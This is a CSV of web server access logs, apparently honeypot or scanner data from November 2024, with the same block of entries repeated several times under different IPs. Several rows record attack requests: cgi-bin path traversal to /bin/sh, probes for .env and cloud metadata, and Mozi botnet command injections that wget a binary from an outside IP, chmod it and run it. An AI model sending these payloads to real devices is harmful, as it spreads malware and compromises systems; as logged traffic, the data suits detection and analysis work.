ip,date,method,endpoint,status,size
226.118.181.70,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
46.44.138.105,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
218.237.106.50,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
30.199.132.50,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
111.46.96.10,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
73.82.187.246,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
64.116.87.43,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
100.177.15.130,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
31.38.171.181,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
141.189.70.136,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
213.67.116.231,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
159.140.107.232,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
45.11.74.234,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
4.174.134.146,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
23.187.162.159,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
206.241.132.74,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
184.158.165.17,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
186.191.37.138,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
102.225.133.28,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
253.68.197.126,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
65.253.97.198,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
80.34.210.18,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
29.61.35.150,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
76.196.106.207,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
155.230.200.44,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
70.52.175.71,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
127.84.188.48,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
210.234.139.45,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
246.214.132.250,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
190.217.123.171,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
103.163.244.96,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
236.185.187.129,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
195.72.80.163,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
196.147.162.214,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
4.239.73.90,15/Nov/2024:00:35:31 +0000,,-,408,
240.145.76.214,15/Nov/2024:00:36:08 +0000,,-,408,
35.103.106.123,15/Nov/2024:00:36:30 +0000,,-,408,
27.129.88.183,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
199.63.9.230,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
124.80.54.159,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
144.21.188.200,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
96.74.145.6,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
205.151.140.51,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
253.80.114.102,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
239.12.6.86,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
71.163.5.100,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
116.71.32.211,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
53.233.223.158,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
132.4.151.87,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
37.155.149.233,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
226.145.146.64,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
203.59.42.98,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
209.188.13.217,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
132.170.157.116,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
108.254.46.205,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
64.118.173.42,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
102.173.92.232,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
240.57.59.189,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
200.62.198.129,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
16.106.53.59,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
138.212.91.202,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
172.224.73.97,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
5.171.83.246,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
231.228.82.110,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
26.124.201.92,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
8.113.252.72,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
54.130.195.131,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
95.141.99.138,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
233.35.66.62,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
79.65.80.187,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
151.186.206.170,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
35.213.48.56,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
138.66.143.3,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
197.79.219.157,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
59.69.249.113,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
52.158.84.56,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
115.96.221.94,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
137.140.227.151,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
165.71.33.136,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
104.173.19.21,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
232.33.215.36,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
77.138.134.8,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
70.88.137.32,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
27.106.104.79,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
26.245.146.22,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
90.108.250.248,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
129.125.72.192,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
229.209.67.185,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
235.24.225.92,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
110.199.134.218,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
89.11.22.188,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
138.162.175.64,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
102.153.135.223,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
118.228.14.135,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
111.152.250.93,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
144.208.253.95,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
204.249.240.93,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
218.84.175.156,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
99.115.124.84,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
219.127.225.224,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
26.11.227.121,19/Nov/2024:20:16:26 +0000,,-,408,
45.45.118.246,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
13.204.109.135,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
156.175.57.205,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
245.193.108.23,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
239.242.134.225,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
79.20.90.218,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
108.119.15.124,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
24.117.75.82,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
3.64.146.209,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
160.251.17.71,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
56.4.174.138,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
12.128.204.203,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
28.194.115.60,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
42.121.253.93,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
88.31.160.227,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
203.129.145.107,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
35.27.114.10,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
49.87.24.27,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
108.194.215.176,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
246.118.109.5,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
221.84.151.49,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
146.247.150.100,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
252.234.30.135,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
215.157.90.248,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
19.112.94.85,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
194.238.157.238,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
116.223.102.15,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
161.188.85.17,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
85.230.233.68,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
252.28.7.130,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
98.215.34.13,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
246.35.134.66,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
201.62.42.103,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
139.86.115.142,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
68.246.252.176,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
36.15.65.208,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
155.136.33.67,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
164.134.254.197,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
95.7.30.96,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
183.212.136.245,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
107.188.206.56,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
174.29.234.154,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
211.118.116.12,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
4.236.209.116,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
185.243.139.117,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
199.92.35.23,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
95.4.218.103,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
31.106.246.67,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
120.189.94.61,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
147.41.220.24,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
22.78.159.65,15/Nov/2024:00:35:31 +0000,,-,408,
226.140.123.196,15/Nov/2024:00:36:08 +0000,,-,408,
107.233.188.156,15/Nov/2024:00:36:30 +0000,,-,408,
152.27.27.231,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
95.137.119.33,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
187.55.56.58,15/Nov/2024:06:13:35 +0000,POST,/apply.cgi,404,196.0
179.15.67.192,15/Nov/2024:09:22:38 +0000,,\x16\x03\x02\x01o\x01,400,226.0
175.100.154.223,15/Nov/2024:11:52:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
204.177.126.160,15/Nov/2024:15:10:02 +0000,GET,/users?id=1,404,196.0
162.94.61.91,15/Nov/2024:15:10:40 +0000,GET,/user?id=1,404,196.0
190.200.192.94,15/Nov/2024:16:20:04 +0000,,\x16\x03\x02\x01o\x01,400,226.0
253.146.156.204,15/Nov/2024:16:38:28 +0000,GET,/cdn-cgi/trace,404,196.0
209.109.246.186,15/Nov/2024:20:32:25 +0000,GET,/cgi-bin/index.cgi,404,196.0
2.65.46.143,16/Nov/2024:00:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
17.32.76.233,16/Nov/2024:02:48:27 +0000,GET,/,400,226.0
126.208.17.33,16/Nov/2024:03:02:41 +0000,POST,/boaform/admin/formLogin,404,196.0
189.161.29.56,16/Nov/2024:08:36:33 +0000,GET,/cdn-cgi/trace,404,196.0
219.174.66.76,16/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
170.48.12.113,16/Nov/2024:12:55:58 +0000,GET,/favicon.ico,404,196.0
76.174.244.40,16/Nov/2024:13:03:46 +0000,GET,/cdn-cgi/trace,404,196.0
140.132.118.27,16/Nov/2024:14:04:10 +0000,POST,/apply.cgi,404,196.0
149.188.20.129,16/Nov/2024:16:32:08 +0000,,\x16\x03\x01,400,226.0
239.41.121.77,16/Nov/2024:16:39:45 +0000,GET,/cdn-cgi/trace,404,196.0
236.149.85.166,16/Nov/2024:22:57:17 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
96.70.163.112,17/Nov/2024:00:37:01 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
218.126.165.83,17/Nov/2024:00:38:31 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
74.122.49.80,17/Nov/2024:03:23:46 +0000,HEAD,/invoker/JMXInvokerServlet,404,
181.3.73.171,17/Nov/2024:03:23:52 +0000,HEAD,/web-console/ServerInfo.jsp,404,
69.166.116.230,17/Nov/2024:03:36:47 +0000,,\x16\x03\x02\x01o\x01,400,226.0
101.17.61.235,17/Nov/2024:04:26:58 +0000,GET,/.env,404,196.0
59.133.55.65,17/Nov/2024:06:02:33 +0000,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://120.229.204.159:33456/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,404,196.0
233.232.63.118,17/Nov/2024:08:36:38 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
5.87.225.96,17/Nov/2024:11:17:36 +0000,,\x16\x03\x01,400,226.0
95.166.176.116,17/Nov/2024:13:13:27 +0000,,\x16\x03\x02\x01o\x01,400,226.0
153.70.158.68,17/Nov/2024:15:38:30 +0000,,\x16\x03\x02\x01o\x01,400,226.0
166.73.134.33,17/Nov/2024:16:38:32 +0000,GET,/cdn-cgi/trace,404,196.0
107.227.119.224,17/Nov/2024:16:38:36 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
213.239.146.65,17/Nov/2024:18:16:45 +0000,,\x16\x03\x01,400,226.0
132.234.145.27,17/Nov/2024:18:16:52 +0000,GET,/favicon.ico,404,196.0
232.7.126.108,17/Nov/2024:19:53:08 +0000,,\x16\x03\x03,400,226.0
210.190.201.30,17/Nov/2024:22:18:05 +0000,,\x16\x03\x01,400,226.0
242.250.112.192,18/Nov/2024:00:37:25 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
94.73.176.169,18/Nov/2024:03:22:12 +0000,GET,/favicon.ico,404,196.0
104.4.152.244,18/Nov/2024:06:54:41 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
6.74.16.127,18/Nov/2024:07:59:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
21.39.79.102,18/Nov/2024:08:36:32 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
252.130.49.109,18/Nov/2024:08:39:15 +0000,GET,/cdn-cgi/trace,404,196.0
124.97.131.94,18/Nov/2024:08:39:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
87.230.225.79,18/Nov/2024:08:41:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
42.13.23.168,18/Nov/2024:11:27:14 +0000,GET,/cgi-bin/index.html,404,196.0
188.116.18.181,18/Nov/2024:14:34:10 +0000,GET,/favicon.ico,404,196.0
152.14.251.11,18/Nov/2024:14:34:13 +0000,GET,/favicon.ico,404,196.0
142.64.83.144,18/Nov/2024:16:39:16 +0000,GET,/cdn-cgi/trace,404,196.0
200.223.211.92,18/Nov/2024:17:15:03 +0000,,\x16\x03\x02\x01o\x01,400,226.0
186.250.110.212,19/Nov/2024:00:01:28 +0000,,\x16\x03\x02\x01o\x01,400,226.0
141.98.199.4,19/Nov/2024:00:39:21 +0000,GET,/cdn-cgi/trace,404,196.0
181.117.60.73,19/Nov/2024:01:18:35 +0000,GET,/static/admin/javascript/hetong.js,404,196.0
160.238.52.213,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196.0
215.241.23.92,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196.0
102.106.172.48,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226.0
34.173.55.239,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
162.17.97.222,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
161.207.205.43,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196.0
162.86.63.137,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226.0
7.2.36.239,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196.0
249.177.87.97,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196.0
235.198.60.20,19/Nov/2024:20:16:26 +0000,,-,408,
239.128.22.73,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226.0
215.43.134.252,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226.0
113.164.14.140,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196.0
47.36.12.22,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226.0
35.191.171.105,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224.0
208.95.55.11,20/Nov/2024:04:43:35 +0000,GET,/,400,226.0
124.236.175.225,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196.0
102.205.74.215,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
193.14.174.17,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196.0
183.47.53.71,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196.0
120.148.59.159,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196.0
245.2.108.219,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196.0
118.198.212.180,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196.0
29.198.86.250,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196.0
88.33.88.180,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196.0
177.0.164.166,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196.0
140.116.209.153,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
209.187.144.10,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196.0
95.54.224.73,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226.0
149.94.34.92,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226.0
222.74.26.33,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196.0
145.183.64.243,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196.0
176.226.141.12,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196.0
50.248.58.159,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196.0
196.58.214.113,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226.0
245.55.171.105,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226.0
193.71.47.157,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226.0
171.40.196.150,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196.0
64.135.156.195,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196.0
94.58.133.138,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
44.25.95.204,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226.0
111.162.99.241,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
96.212.61.165,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196.0
1.232.8.232,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226.0
77.197.38.65,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226.0
180.244.254.116,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196.0
226.187.181.197,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196.0
3.89.180.49,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196.0
242.153.201.246,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226.0
229.193.121.103,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
223.242.31.60,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226.0
235.109.134.92,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196.0
21.184.90.221,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
94.129.224.168,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196.0
227.108.122.90,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226.0
128.0.61.10,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226.0
250.184.190.105,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196.0
32.135.62.204,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226.0
104.16.147.40,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196.0
97.45.26.32,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196.0
53.141.178.148,15/Nov/2024:00:35:31 +0000,,-,408,
13.241.225.240,15/Nov/2024:00:36:08 +0000,,-,408,
99.12.21.221,15/Nov/2024:00:36:30 +0000,,-,408,
18.138.10.110,15/Nov/2024:00:36:34 +0000,,stats,400,226.0
223.94.9.239,15/Nov/2024:00:59:21 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226.0
